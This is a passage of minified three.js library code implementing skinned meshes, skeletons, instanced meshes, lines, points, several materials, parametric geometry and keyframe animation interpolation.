this.normalized } } });
        const oa = new be,
            sa = new be,
            la = new be,
            ca = new ye,
            ua = new ye,
            ha = new be,
            da = new Ze;

        function pa(e, t) { Dn.call(this, e, t), this.type = "SkinnedMesh", this.bindMode = "attached", this.bindMatrix = new Ze, this.bindMatrixInverse = new Ze }

        function fa() { _t.call(this), this.type = "Bone" }
        pa.prototype = Object.assign(Object.create(Dn.prototype), {
            constructor: pa,
            isSkinnedMesh: !0,
            copy: function(e) { return Dn.prototype.copy.call(this, e), this.bindMode = e.bindMode, this.bindMatrix.copy(e.bindMatrix), this.bindMatrixInverse.copy(e.bindMatrixInverse), this.skeleton = e.skeleton, this },
            bind: function(e, t) { this.skeleton = e, void 0 === t && (this.updateMatrixWorld(!0), this.skeleton.calculateInverses(), t = this.matrixWorld), this.bindMatrix.copy(t), this.bindMatrixInverse.copy(t).invert() },
            pose: function() { this.skeleton.pose() },
            normalizeSkinWeights: function() {
                const e = new ye,
                    t = this.geometry.attributes.skinWeight;
                for (let n = 0, i = t.count; n < i; n++) {
                    e.x = t.getX(n), e.y = t.getY(n), e.z = t.getZ(n), e.w = t.getW(n);
                    const i = 1 / e.manhattanLength();
                    i !== 1 / 0 ? e.multiplyScalar(i) : e.set(1, 0, 0, 0), t.setXYZW(n, e.x, e.y, e.z, e.w)
                }
            },
            updateMatrixWorld: function(e) { Dn.prototype.updateMatrixWorld.call(this, e), "attached" === this.bindMode ? this.bindMatrixInverse.copy(this.matrixWorld).invert() : "detached" === this.bindMode ? this.bindMatrixInverse.copy(this.bindMatrix).invert() : console.warn("THREE.SkinnedMesh: Unrecognized bindMode: " + this.bindMode) },
            boneTransform: function(e, t) {
                const n = this.skeleton,
                    i = this.geometry;
                ca.fromBufferAttribute(i.attributes.skinIndex, e), ua.fromBufferAttribute(i.attributes.skinWeight, e), la.fromBufferAttribute(i.attributes.position, e).applyMatrix4(this.bindMatrix), t.set(0, 0, 0);
                for (let e = 0; e < 4; e++) {
                    const i = ua.getComponent(e);
                    if (0 !== i) {
                        const r = ca.getComponent(e);
                        da.multiplyMatrices(n.bones[r].matrixWorld, n.boneInverses[r]), t.addScaledVector(ha.copy(la).applyMatrix4(da), i)
                    }
                }
                return t.applyMatrix4(this.bindMatrixInverse)
            }
        }), fa.prototype = Object.assign(Object.create(_t.prototype), { constructor: fa, isBone: !0 });
        const ma = new Ze,
            ga = new Ze;
        class va {
            constructor(e = [], t = []) { this.uuid = ue.generateUUID(), this.bones = e.slice(0), this.boneInverses = t, this.boneMatrices = null, this.boneTexture = null, this.boneTextureSize = 0, this.frame = -1, this.init() }
            init() {
                const e = this.bones,
                    t = this.boneInverses;
                if (this.boneMatrices = new Float32Array(16 * e.length), 0 === t.length) this.calculateInverses();
                else if (e.length !== t.length) { console.warn("THREE.Skeleton: Number of inverse bone matrices does not match amount of bones."), this.boneInverses = []; for (let e = 0, t = this.bones.length; e < t; e++) this.boneInverses.push(new Ze) }
            }
            calculateInverses() {
                this.boneInverses.length = 0;
                for (let e = 0, t = this.bones.length; e < t; e++) {
                    const t = new Ze;
                    this.bones[e] && t.copy(this.bones[e].matrixWorld).invert(), this.boneInverses.push(t)
                }
            }
            pose() {
                for (let e = 0, t = this.bones.length; e < t; e++) {
                    const t = this.bones[e];
                    t && t.matrixWorld.copy(this.boneInverses[e]).invert()
                }
                for (let e = 0, t = this.bones.length; e < t; e++) {
                    const t = this.bones[e];
                    t && (t.parent && t.parent.isBone ? (t.matrix.copy(t.parent.matrixWorld).invert(), t.matrix.multiply(t.matrixWorld)) : t.matrix.copy(t.matrixWorld), t.matrix.decompose(t.position, t.quaternion, t.scale))
                }
            }
            update() {
                const e = this.bones,
                    t = this.boneInverses,
                    n = this.boneMatrices,
                    i = this.boneTexture;
                for (let i = 0, r = e.length; i < r; i++) {
                    const r = e[i] ? e[i].matrixWorld : ga;
                    ma.multiplyMatrices(r, t[i]), ma.toArray(n, 16 * i)
                }
                null !== i && (i.needsUpdate = !0)
            }
            clone() { return new va(this.bones, this.boneInverses) }
            getBoneByName(e) { for (let t = 0, n = this.bones.length; t < n; t++) { const n = this.bones[t]; if (n.name === e) return n } }
            dispose() { null !== this.boneTexture && (this.boneTexture.dispose(), this.boneTexture = null) }
            fromJSON(e, t) {
                this.uuid = e.uuid;
                for (let n = 0, i = e.bones.length; n < i; n++) {
                    const i = e.bones[n];
                    let r = t[i];
                    void 0 === r && (console.warn("THREE.Skeleton: No bone found with UUID:", i), r = new fa), this.bones.push(r), this.boneInverses.push((new Ze).fromArray(e.boneInverses[n]))
                }
                return this.init(), this
            }
            toJSON() {
                const e = { metadata: { version: 4.5, type: "Skeleton", generator: "Skeleton.toJSON" }, bones: [], boneInverses: [] };
                e.uuid = this.uuid;
                const t = this.bones,
                    n = this.boneInverses;
                for (let i = 0, r = t.length; i < r; i++) {
                    const r = t[i];
                    e.bones.push(r.uuid);
                    const a = n[i];
                    e.boneInverses.push(a.toArray())
                }
                return e
            }
        }
        const ya = new Ze,
            xa = new Ze,
            _a = [],
            ba = new Dn;

        function wa(e, t, n) { Dn.call(this, e, t), this.instanceMatrix = new Yt(new Float32Array(16 * n), 16), this.instanceColor = null, this.count = n, this.frustumCulled = !1 }
        wa.prototype = Object.assign(Object.create(Dn.prototype), {
            constructor: wa,
            isInstancedMesh: !0,
            copy: function(e) { return Dn.prototype.copy.call(this, e), this.instanceMatrix.copy(e.instanceMatrix), null !== e.instanceColor && (this.instanceColor = e.instanceColor.clone()), this.count = e.count, this },
            getColorAt: function(e, t) { t.fromArray(this.instanceColor.array, 3 * e) },
            getMatrixAt: function(e, t) { t.fromArray(this.instanceMatrix.array, 16 * e) },
            raycast: function(e, t) {
                const n = this.matrixWorld,
                    i = this.count;
                if (ba.geometry = this.geometry, ba.material = this.material, void 0 !== ba.material)
                    for (let r = 0; r < i; r++) {
                        this.getMatrixAt(r, ya), xa.multiplyMatrices(n, ya), ba.matrixWorld = xa, ba.raycast(e, _a);
                        for (let e = 0, n = _a.length; e < n; e++) {
                            const n = _a[e];
                            n.instanceId = r, n.object = this, t.push(n)
                        }
                        _a.length = 0
                    }
            },
            setColorAt: function(e, t) { null === this.instanceColor && (this.instanceColor = new Yt(new Float32Array(3 * this.count), 3)), t.toArray(this.instanceColor.array, 3 * e) },
            setMatrixAt: function(e, t) { t.toArray(this.instanceMatrix.array, 16 * e) },
            updateMorphTargets: function() {},
            dispose: function() { this.dispatchEvent({ type: "dispose" }) }
        });
        class Ma extends Ut {
            constructor(e) { super(), this.type = "LineBasicMaterial", this.color = new Wt(16777215), this.linewidth = 1, this.linecap = "round", this.linejoin = "round", this.morphTargets = !1, this.setValues(e) }
            copy(e) { return super.copy(e), this.color.copy(e.color), this.linewidth = e.linewidth, this.linecap = e.linecap, this.linejoin = e.linejoin, this.morphTargets = e.morphTargets, this }
        }
        Ma.prototype.isLineBasicMaterial = !0;
        const Ta = new be,
            Ea = new be,
            Sa = new Ze,
            La = new Ye,
            Aa = new Be;

        function Ra(e = new fn, t = new Ma) { _t.call(this), this.type = "Line", this.geometry = e, this.material = t, this.updateMorphTargets() }
        Ra.prototype = Object.assign(Object.create(_t.prototype), {
            constructor: Ra,
            isLine: !0,
            copy: function(e) { return _t.prototype.copy.call(this, e), this.material = e.material, this.geometry = e.geometry, this },
            computeLineDistances: function() {
                const e = this.geometry;
                if (e.isBufferGeometry)
                    if (null === e.index) {
                        const t = e.attributes.position,
                            n = [0];
                        for (let e = 1, i = t.count; e < i; e++) Ta.fromBufferAttribute(t, e - 1), Ea.fromBufferAttribute(t, e), n[e] = n[e - 1], n[e] += Ta.distanceTo(Ea);
                        e.setAttribute("lineDistance", new rn(n, 1))
                    } else console.warn("THREE.Line.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");
                else e.isGeometry && console.error("THREE.Line.computeLineDistances() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.");
                return this
            },
            raycast: function(e, t) {
                const n = this.geometry,
                    i = this.matrixWorld,
                    r = e.params.Line.threshold;
                if (null === n.boundingSphere && n.computeBoundingSphere(), Aa.copy(n.boundingSphere), Aa.applyMatrix4(i), Aa.radius += r, !1 === e.ray.intersectsSphere(Aa)) return;
                Sa.copy(i).invert(), La.copy(e.ray).applyMatrix4(Sa);
                const a = r / ((this.scale.x + this.scale.y + this.scale.z) / 3),
                    o = a * a,
                    s = new be,
                    l = new be,
                    c = new be,
                    u = new be,
                    h = this.isLineSegments ? 2 : 1;
                if (n.isBufferGeometry) {
                    const i = n.index,
                        r = n.attributes.position;
                    if (null !== i) {
                        const n = i.array;
                        for (let i = 0, a = n.length - 1; i < a; i += h) {
                            const a = n[i],
                                h = n[i + 1];
                            if (s.fromBufferAttribute(r, a), l.fromBufferAttribute(r, h), La.distanceSqToSegment(s, l, u, c) > o) continue;
                            u.applyMatrix4(this.matrixWorld);
                            const d = e.ray.origin.distanceTo(u);
                            d < e.near || d > e.far || t.push({ distance: d, point: c.clone().applyMatrix4(this.matrixWorld), index: i, face: null, faceIndex: null, object: this })
                        }
                    } else
                        for (let n = 0, i = r.count - 1; n < i; n += h) {
                            if (s.fromBufferAttribute(r, n), l.fromBufferAttribute(r, n + 1), La.distanceSqToSegment(s, l, u, c) > o) continue;
                            u.applyMatrix4(this.matrixWorld);
                            const i = e.ray.origin.distanceTo(u);
                            i < e.near || i > e.far || t.push({ distance: i, point: c.clone().applyMatrix4(this.matrixWorld), index: n, face: null, faceIndex: null, object: this })
                        }
                } else n.isGeometry && console.error("THREE.Line.raycast() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.")
            },
            updateMorphTargets: function() {
                const e = this.geometry;
                if (e.isBufferGeometry) {
                    const t = e.morphAttributes,
                        n = Object.keys(t);
                    if (n.length > 0) {
                        const e = t[n[0]];
                        if (void 0 !== e) {
                            this.morphTargetInfluences = [], this.morphTargetDictionary = {};
                            for (let t = 0, n = e.length; t < n; t++) {
                                const n = e[t].name || String(t);
                                this.morphTargetInfluences.push(0), this.morphTargetDictionary[n] = t
                            }
                        }
                    }
                } else {
                    const t = e.morphTargets;
                    void 0 !== t && t.length > 0 && console.error("THREE.Line.updateMorphTargets() does not support THREE.Geometry. Use THREE.BufferGeometry instead.")
                }
            }
        });
        const Pa = new be,
            Ca = new be;

        function Da(e, t) { Ra.call(this, e, t), this.type = "LineSegments" }
        Da.prototype = Object.assign(Object.create(Ra.prototype), {
            constructor: Da,
            isLineSegments: !0,
            computeLineDistances: function() {
                const e = this.geometry;
                if (e.isBufferGeometry)
                    if (null === e.index) {
                        const t = e.attributes.position,
                            n = [];
                        for (let e = 0, i = t.count; e < i; e += 2) Pa.fromBufferAttribute(t, e), Ca.fromBufferAttribute(t, e + 1), n[e] = 0 === e ? 0 : n[e - 1], n[e + 1] = n[e] + Pa.distanceTo(Ca);
                        e.setAttribute("lineDistance", new rn(n, 1))
                    } else console.warn("THREE.LineSegments.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");
                else e.isGeometry && console.error("THREE.LineSegments.computeLineDistances() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.");
                return this
            }
        });
        class Na extends Ra { constructor(e, t) { super(e, t), this.type = "LineLoop" } }
        Na.prototype.isLineLoop = !0;
        class Ia extends Ut {
            constructor(e) { super(), this.type = "PointsMaterial", this.color = new Wt(16777215), this.map = null, this.alphaMap = null, this.size = 1, this.sizeAttenuation = !0, this.morphTargets = !1, this.setValues(e) }
            copy(e) { return super.copy(e), this.color.copy(e.color), this.map = e.map, this.alphaMap = e.alphaMap, this.size = e.size, this.sizeAttenuation = e.sizeAttenuation, this.morphTargets = e.morphTargets, this }
        }
        Ia.prototype.isPointsMaterial = !0;
        const Oa = new Ze,
            Ha = new Ye,
            Ua = new Be,
            Fa = new be;

        function za(e = new fn, t = new Ia) { _t.call(this), this.type = "Points", this.geometry = e, this.material = t, this.updateMorphTargets() }

        function Ba(e, t, n, i, r, a, o) {
            const s = Ha.distanceSqToPoint(e);
            if (s < n) {
                const n = new be;
                Ha.closestPointToPoint(e, n), n.applyMatrix4(i);
                const l = r.ray.origin.distanceTo(n);
                if (l < r.near || l > r.far) return;
                a.push({ distance: l, distanceToRay: Math.sqrt(s), point: n, index: t, face: null, object: o })
            }
        }
        za.prototype = Object.assign(Object.create(_t.prototype), {
            constructor: za,
            isPoints: !0,
            copy: function(e) { return _t.prototype.copy.call(this, e), this.material = e.material, this.geometry = e.geometry, this },
            raycast: function(e, t) {
                const n = this.geometry,
                    i = this.matrixWorld,
                    r = e.params.Points.threshold;
                if (null === n.boundingSphere && n.computeBoundingSphere(), Ua.copy(n.boundingSphere), Ua.applyMatrix4(i), Ua.radius += r, !1 === e.ray.intersectsSphere(Ua)) return;
                Oa.copy(i).invert(), Ha.copy(e.ray).applyMatrix4(Oa);
                const a = r / ((this.scale.x + this.scale.y + this.scale.z) / 3),
                    o = a * a;
                if (n.isBufferGeometry) {
                    const r = n.index,
                        a = n.attributes.position;
                    if (null !== r) {
                        const n = r.array;
                        for (let r = 0, s = n.length; r < s; r++) {
                            const s = n[r];
                            Fa.fromBufferAttribute(a, s), Ba(Fa, s, o, i, e, t, this)
                        }
                    } else
                        for (let n = 0, r = a.count; n < r; n++) Fa.fromBufferAttribute(a, n), Ba(Fa, n, o, i, e, t, this)
                } else console.error("THREE.Points.raycast() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.")
            },
            updateMorphTargets: function() {
                const e = this.geometry;
                if (e.isBufferGeometry) {
                    const t = e.morphAttributes,
                        n = Object.keys(t);
                    if (n.length > 0) {
                        const e = t[n[0]];
                        if (void 0 !== e) {
                            this.morphTargetInfluences = [], this.morphTargetDictionary = {};
                            for (let t = 0, n = e.length; t < n; t++) {
                                const n = e[t].name || String(t);
                                this.morphTargetInfluences.push(0), this.morphTargetDictionary[n] = t
                            }
                        }
                    }
                } else {
                    const t = e.morphTargets;
                    void 0 !== t && t.length > 0 && console.error("THREE.Points.updateMorphTargets() does not support THREE.Geometry. Use THREE.BufferGeometry instead.")
                }
            }
        });
        class Ga extends ge { constructor(e, t, n, i, r, a, o, s, l, c, u, h) { super(null, a, o, s, l, c, i, r, u, h), this.image = { width: t, height: n }, this.mipmaps = e, this.flipY = !1, this.generateMipmaps = !1 } }
        Ga.prototype.isCompressedTexture = !0;
        class ka extends ge { constructor(e, t, n, i, r, a, o, s, l) { super(e, t, n, i, r, a, o, s, l), this.needsUpdate = !0 } }

        function Va(e, t, n) {
            fn.call(this), this.type = "ParametricGeometry", this.parameters = { func: e, slices: t, stacks: n };
            const i = [],
                r = [],
                a = [],
                o = [],
                s = 1e-5,
                l = new be,
                c = new be,
                u = new be,
                h = new be,
                d = new be;
            e.length < 3 && console.error("THREE.ParametricGeometry: Function must now modify a Vector3 as third parameter.");
            const p = t + 1;
            for (let i = 0; i <= n; i++) {
                const p = i / n;
                for (let n = 0; n <= t; n++) {
                    const i = n / t;
                    e(i, p, c), r.push(c.x, c.y, c.z), i - s >= 0 ? (e(i - s, p, u), h.subVectors(c, u)) : (e(i + s, p, u), h.subVectors(u, c)), p - s >= 0 ? (e(i, p - s, u), d.subVectors(c, u)) : (e(i, p + s, u), d.subVectors(u, c)), l.crossVectors(h, d).normalize(), a.push(l.x, l.y, l.z), o.push(i, p)
                }
            }
            for (let e = 0; e < n; e++)
                for (let n = 0; n < t; n++) {
                    const t = e * p + n,
                        r = e * p + n + 1,
                        a = (e + 1) * p + n + 1,
                        o = (e + 1) * p + n;
                    i.push(t, r, o), i.push(r, a, o)
                }
            this.setIndex(i), this.setAttribute("position", new rn(r, 3)), this.setAttribute("normal", new rn(a, 3)), this.setAttribute("uv", new rn(o, 2))
        }

        function Wa(e) { Ut.call(this), this.defines = { STANDARD: "" }, this.type = "MeshStandardMaterial", this.color = new Wt(16777215), this.roughness = 1, this.metalness = 0, this.map = null, this.lightMap = null, this.lightMapIntensity = 1, this.aoMap = null, this.aoMapIntensity = 1, this.emissive = new Wt(0), this.emissiveIntensity = 1, this.emissiveMap = null, this.bumpMap = null, this.bumpScale = 1, this.normalMap = null, this.normalMapType = 0, this.normalScale = new he(1, 1), this.displacementMap = null, this.displacementScale = 1, this.displacementBias = 0, this.roughnessMap = null, this.metalnessMap = null, this.alphaMap = null, this.envMap = null, this.envMapIntensity = 1, this.refractionRatio = .98, this.wireframe = !1, this.wireframeLinewidth = 1, this.wireframeLinecap = "round", this.wireframeLinejoin = "round", this.skinning = !1, this.morphTargets = !1, this.morphNormals = !1, this.flatShading = !1, this.vertexTangents = !1, this.setValues(e) }

        function ja(e) { Wa.call(this), this.defines = { STANDARD: "", PHYSICAL: "" }, this.type = "MeshPhysicalMaterial", this.clearcoat = 0, this.clearcoatMap = null, this.clearcoatRoughness = 0, this.clearcoatRoughnessMap = null, this.clearcoatNormalScale = new he(1, 1), this.clearcoatNormalMap = null, this.reflectivity = .5, Object.defineProperty(this, "ior", { get: function() { return (1 + .4 * this.reflectivity) / (1 - .4 * this.reflectivity) }, set: function(e) { this.reflectivity = ue.clamp(2.5 * (e - 1) / (e + 1), 0, 1) } }), this.sheen = null, this.transmission = 0, this.transmissionMap = null, this.setValues(e) }
        ka.prototype.isCanvasTexture = !0, Va.prototype = Object.create(fn.prototype), Va.prototype.constructor = Va, Wa.prototype = Object.create(Ut.prototype), Wa.prototype.constructor = Wa, Wa.prototype.isMeshStandardMaterial = !0, Wa.prototype.copy = function(e) { return Ut.prototype.copy.call(this, e), this.defines = { STANDARD: "" }, this.color.copy(e.color), this.roughness = e.roughness, this.metalness = e.metalness, this.map = e.map, this.lightMap = e.lightMap, this.lightMapIntensity = e.lightMapIntensity, this.aoMap = e.aoMap, this.aoMapIntensity = e.aoMapIntensity, this.emissive.copy(e.emissive), this.emissiveMap = e.emissiveMap, this.emissiveIntensity = e.emissiveIntensity, this.bumpMap = e.bumpMap, this.bumpScale = e.bumpScale, this.normalMap = e.normalMap, this.normalMapType = e.normalMapType, this.normalScale.copy(e.normalScale), this.displacementMap = e.displacementMap, this.displacementScale = e.displacementScale, this.displacementBias = e.displacementBias, this.roughnessMap = e.roughnessMap, this.metalnessMap = e.metalnessMap, this.alphaMap = e.alphaMap, this.envMap = e.envMap, this.envMapIntensity = e.envMapIntensity, this.refractionRatio = e.refractionRatio, this.wireframe = e.wireframe, this.wireframeLinewidth = e.wireframeLinewidth, this.wireframeLinecap = e.wireframeLinecap, this.wireframeLinejoin = e.wireframeLinejoin, this.skinning = e.skinning, this.morphTargets = e.morphTargets, this.morphNormals = e.morphNormals, this.flatShading = e.flatShading, this.vertexTangents = e.vertexTangents, this }, ja.prototype = Object.create(Wa.prototype), ja.prototype.constructor = ja, ja.prototype.isMeshPhysicalMaterial = !0, ja.prototype.copy = function(e) { return Wa.prototype.copy.call(this, e), this.defines = { STANDARD: "", PHYSICAL: "" }, this.clearcoat = e.clearcoat, this.clearcoatMap = e.clearcoatMap, this.clearcoatRoughness = e.clearcoatRoughness, this.clearcoatRoughnessMap = e.clearcoatRoughnessMap, this.clearcoatNormalMap = e.clearcoatNormalMap, this.clearcoatNormalScale.copy(e.clearcoatNormalScale), this.reflectivity = e.reflectivity, e.sheen ? this.sheen = (this.sheen || new Wt).copy(e.sheen) : this.sheen = null, this.transmission = e.transmission, this.transmissionMap = e.transmissionMap, this };
        class qa extends Ut {
            constructor(e) { super(), this.type = "MeshPhongMaterial", this.color = new Wt(16777215), this.specular = new Wt(1118481), this.shininess = 30, this.map = null, this.lightMap = null, this.lightMapIntensity = 1, this.aoMap = null, this.aoMapIntensity = 1, this.emissive = new Wt(0), this.emissiveIntensity = 1, this.emissiveMap = null, this.bumpMap = null, this.bumpScale = 1, this.normalMap = null, this.normalMapType = 0, this.normalScale = new he(1, 1), this.displacementMap = null, this.displacementScale = 1, this.displacementBias = 0, this.specularMap = null, this.alphaMap = null, this.envMap = null, this.combine = 0, this.reflectivity = 1, this.refractionRatio = .98, this.wireframe = !1, this.wireframeLinewidth = 1, this.wireframeLinecap = "round", this.wireframeLinejoin = "round", this.skinning = !1, this.morphTargets = !1, this.morphNormals = !1, this.flatShading = !1, this.setValues(e) }
            copy(e) { return super.copy(e), this.color.copy(e.color), this.specular.copy(e.specular), this.shininess = e.shininess, this.map = e.map, this.lightMap = e.lightMap, this.lightMapIntensity = e.lightMapIntensity, this.aoMap = e.aoMap, this.aoMapIntensity = e.aoMapIntensity, this.emissive.copy(e.emissive), this.emissiveMap = e.emissiveMap, this.emissiveIntensity = e.emissiveIntensity, this.bumpMap = e.bumpMap, this.bumpScale = e.bumpScale, this.normalMap = e.normalMap, this.normalMapType = e.normalMapType, this.normalScale.copy(e.normalScale), this.displacementMap = e.displacementMap, this.displacementScale = e.displacementScale, this.displacementBias = e.displacementBias, this.specularMap = e.specularMap, this.alphaMap = e.alphaMap, this.envMap = e.envMap, this.combine = e.combine, this.reflectivity = e.reflectivity, this.refractionRatio = e.refractionRatio, this.wireframe = e.wireframe, this.wireframeLinewidth = e.wireframeLinewidth, this.wireframeLinecap = e.wireframeLinecap, this.wireframeLinejoin = e.wireframeLinejoin, this.skinning = e.skinning, this.morphTargets = e.morphTargets, this.morphNormals = e.morphNormals, this.flatShading = e.flatShading, this }
        }
        qa.prototype.isMeshPhongMaterial = !0;
        const Xa = {
            arraySlice: function(e, t, n) { return Xa.isTypedArray(e) ? new e.constructor(e.subarray(t, void 0 !== n ? n : e.length)) : e.slice(t, n) },
            convertArray: function(e, t, n) { return !e || !n && e.constructor === t ? e : "number" == typeof t.BYTES_PER_ELEMENT ? new t(e) : Array.prototype.slice.call(e) },
            isTypedArray: function(e) { return ArrayBuffer.isView(e) && !(e instanceof DataView) },
            getKeyframeOrder: function(e) {
                const t = e.length,
                    n = new Array(t);
                for (let e = 0; e !== t; ++e) n[e] = e;
                return n.sort((function(t, n) { return e[t] - e[n] })), n
            },
            sortedArray: function(e, t, n) {
                const i = e.length,
                    r = new e.constructor(i);
                for (let a = 0, o = 0; o !== i; ++a) { const i = n[a] * t; for (let n = 0; n !== t; ++n) r[o++] = e[i + n] }
                return r
            },
            flattenJSON: function(e, t, n, i) {
                let r = 1,
                    a = e[0];
                for (; void 0 !== a && void 0 === a[i];) a = e[r++];
                if (void 0 === a) return;
                let o = a[i];
                if (void 0 !== o)
                    if (Array.isArray(o))
                        do { o = a[i], void 0 !== o && (t.push(a.time), n.push.apply(n, o)), a = e[r++] } while (void 0 !== a);
                    else if (void 0 !== o.toArray)
                    do { o = a[i], void 0 !== o && (t.push(a.time), o.toArray(n, n.length)), a = e[r++] } while (void 0 !== a);
                else
                    do { o = a[i], void 0 !== o && (t.push(a.time), n.push(o)), a = e[r++] } while (void 0 !== a)
            },
            subclip: function(e, t, n, i, r = 30) {
                const a = e.clone();
                a.name = t;
                const o = [];
                for (let e = 0; e < a.tracks.length; ++e) {
                    const t = a.tracks[e],
                        s = t.getValueSize(),
                        l = [],
                        c = [];
                    for (let e = 0; e < t.times.length; ++e) { const a = t.times[e] * r; if (!(a < n || a >= i)) { l.push(t.times[e]); for (let n = 0; n < s; ++n) c.push(t.values[e * s + n]) } }
                    0 !== l.length && (t.times = Xa.convertArray(l, t.times.constructor), t.values = Xa.convertArray(c, t.values.constructor), o.push(t))
                }
                a.tracks = o;
                let s = 1 / 0;
                for (let e = 0; e < a.tracks.length; ++e) s > a.tracks[e].times[0] && (s = a.tracks[e].times[0]);
                for (let e = 0; e < a.tracks.length; ++e) a.tracks[e].shift(-1 * s);
                return a.resetDuration(), a
            },
            makeClipAdditive: function(e, t = 0, n = e, i = 30) {
                i <= 0 && (i = 30);
                const r = n.tracks.length,
                    a = t / i;
                for (let t = 0; t < r; ++t) {
                    const i = n.tracks[t],
                        r = i.ValueTypeName;
                    if ("bool" === r || "string" === r) continue;
                    const o = e.tracks.find((function(e) { return e.name === i.name && e.ValueTypeName === r }));
                    if (void 0 === o) continue;
                    let s = 0;
                    const l = i.getValueSize();
                    i.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline && (s = l / 3);
                    let c = 0;
                    const u = o.getValueSize();
                    o.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline && (c = u / 3);
                    const h = i.times.length - 1;
                    let d;
                    if (a <= i.times[0]) {
                        const e = s,
                            t = l - s;
                        d = Xa.arraySlice(i.values, e, t)
                    } else if (a >= i.times[h]) {
                        const e = h * l + s,
                            t = e + l - s;
                        d = Xa.arraySlice(i.values, e, t)
                    } else {
                        const e = i.createInterpolant(),
                            t = s,
                            n = l - s;
                        e.evaluate(a), d = Xa.arraySlice(e.resultBuffer, t, n)
                    }
                    "quaternion" === r && (new _e).fromArray(d).normalize().conjugate().toArray(d);
                    const p = o.times.length;
                    for (let e = 0; e < p; ++e) {
                        const t = e * u + c;
                        if ("quaternion" === r) _e.multiplyQuaternionsFlat(o.values, t, d, 0, o.values, t);
                        else { const e = u - 2 * c; for (let n = 0; n < e; ++n) o.values[t + n] -= d[n] }
                    }
                }
                return e.blendMode = 2501, e
            }
        };

        function Ya(e, t, n, i) { this.parameterPositions = e, this._cachedIndex = 0, this.resultBuffer = void 0 !== i ? i : new t.constructor(n), this.sampleValues = t, this.valueSize = n }

        function Za(e, t, n, i) { Ya.call(this, e, t, n, i), this._weightPrev = -0, this._offsetPrev = -0, this._weightNext = -0, this._offsetNext = -0 }

        function Ja(e, t, n, i) { Ya.call(this, e, t, n, i) }

        function Ka(e, t, n, i) { Ya.call(this, e, t, n, i) }
        Object.assign(Ya.prototype, {
            evaluate: function(e) {
                const t = this.parameterPositions;
                let n = this._cachedIndex,
                    i = t[n],
                    r = t[n - 1];
                e: {
                    t: {
                        let a;n: {
                            i: if (!(e < i)) {
                                for (let a = n + 2;;) { if (void 0 === i) { if (e < r) break i; return n = t.length, this._cachedIndex = n, this.afterEnd_(n - 1, e, r) } if (n === a) break; if (r = i, i = t[++n], e < i) break t }
                                a = t.length;
                                break n
                            }if (e >= r) break e; {
                                const o = t[1];
                                e < o && (n = 2, r = o);
                                for (let a = n - 2;;) { if (void 0 === r) return this._cachedIndex = 0, this.beforeStart_(0, e, i); if (n === a) break; if (i = r, r = t[--n - 1], e >= r) break t }
                                a = n, n = 0
                            }
                        }
                        for (; n < a;) {
                            const i = n + a >>> 1;
                            e < t[i] ? a = i : n = i + 1
                        }
                        if (i = t[n], r = t[n - 1], void 0 === r) return this._cachedIndex = 0, this.beforeStart_(0, e, i);
                        if (void 0 === i) return n = t.length, this._cachedIndex = n, this.afterEnd_(n - 1, r, e)
                    }
                    this._cachedIndex = n,
                    this.intervalChanged_(n, r, i)
                }
                return this.interpolate_(n, r, e, i)
            },
            settings: null,
            DefaultSettings_: {},
            getSettings_: function() { return this.settings || this.DefaultSettings_ },
            copySampleValue_: function(e) {
                const t = this.resultBuffer,
                    n = this.sampleValues,
                    i = this.valueSize,
                    r = e * i;
                for (let e = 0; e !== i; ++e) t[e] = n[r + e];
                return t
            },
            interpolate_: function() { throw new Error("call to abstract method") },
            intervalChanged_: function() {}
        }), Object.assign(Ya.prototype, { beforeStart_: Ya.prototype.copySampleValue_, afterEnd_: Ya.prototype.copySampleValue_ }), Za.prototype = Object.assign(Object.create(Ya.prototype), {
            constructor: Za,
            DefaultSettings_: { endingStart: 2400, endingEnd: 2400 },
            intervalChanged_: function(e, t, n) {
                const i = this.parameterPositions;
                let r = e - 2,
                    a = e + 1,
                    o = i[r],
                    s = i[a];
                if (void 0 === o) switch (this.getSettings_().endingStart) {
                    case 2401:
                        r = e, o = 2 * t - n;
                        break;
                    case 2402:
                        r = i.length - 2, o = t + i[r] - i[r + 1];
                        break;
                    default:
                        r = e, o = n
                }
                if (void 0 === s) switch (this.getSettings_().endingEnd) {
                    case 2401:
                        a = e, s = 2 * n - t;
                        break;
                    case 2402:
                        a = 1, s = n + i[1] - i[0];
                        break;
                    default:
                        a = e - 1, s = t
                }
                const l = .5 * (n - t),
                    c = this.valueSize;
                this._weightPrev = l / (t - o), this._weightNext = l / (s - n), this._offsetPrev = r * c, this._offsetNext = a * c
            },
            interpolate_: function(e, t, n, i) {
                const r = this.resultBuffer,
                    a = this.sampleValues,
                    o = this.valueSize,
                    s = e * o,
                    l = s - o,
                    c = this._offsetPrev,
                    u = this._offsetNext,
                    h = this._weightPrev,
                    d = this._weightNext,
                    p = (n - t) / (i - t),
                    f = p * p,
                    m = f * p,
                    g = -h * m + 2 * h * f - h * p,
                    v = (1 + h) * m + (-1.5 - 2 * h) * f + (-.5 + h) * p + 1,
                    y = (-1 - d) * m + (1.5 + d) * f + .5 * p,
                    x = d * m - d * f;
                for (let e = 0; e !== o; ++e) r[e] = g * a[c + e] + v * a[l + e] + y * a[s + e] + x * a[u + e];
                return r
            }
        }), Ja.prototype = Object.assign(Object.create(Ya.prototype), {
            constructor: Ja,
            interpolate_: function(e, t, n, i) {
                const r = this.resultBuffer,
                    a = this.sampleValues,
                    o = this.valueSize,
                    s = e * o,
                    l = s - o,
                    c = (n - t) / (i - t),
                    u = 1 - c;
                for (let e = 0; e !== o; ++e) r[e] = a[l + e] * u + a[s + e] * c;
                return r
            }
        }), Ka.prototype = Object.assign(Object.create(Ya.prototype), { constructor: Ka, interpolate_: function(e) { return this.copySampleValue_(e - 1) } });
        class $a {
            constructor(e, t, n, i) {
                if (void 0 === e) throw new Error("THREE.KeyframeTrack: track name is undefined");
                if (void 0 === t || 0 === t.length) throw new Error("THREE.KeyframeTrack: no keyframes in track named " + e);
                this.name = e, this.times = Xa.convertArray(t, this.TimeBufferType), this.values = Xa.convertArray(n, this.ValueBufferType), this.setInterpolation(i || this.DefaultInterpolation)
            }
            static toJSON(e) {
                const t = e.constructor;
                let n;
                if (t.toJSON !== this.toJSON) n = t.toJSON(e);
                else {
